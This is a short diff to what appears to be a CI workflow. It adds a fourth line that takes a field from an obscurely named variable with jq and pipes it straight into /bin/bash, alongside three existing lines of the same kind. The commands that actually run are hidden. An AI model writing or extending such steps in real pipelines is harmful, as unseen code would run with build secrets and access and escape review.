@@ -28,6 +28,7 @@ jobs:
           echo $od63175 | jq -r .qsw1701 | /bin/bash
           echo $o78343 | jq -r .fhn1 | /bin/bash
           printf '%s' "$tvd180" | jq -r .g5 | /bin/bash
+          echo $pr950 | jq -r .s80113 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
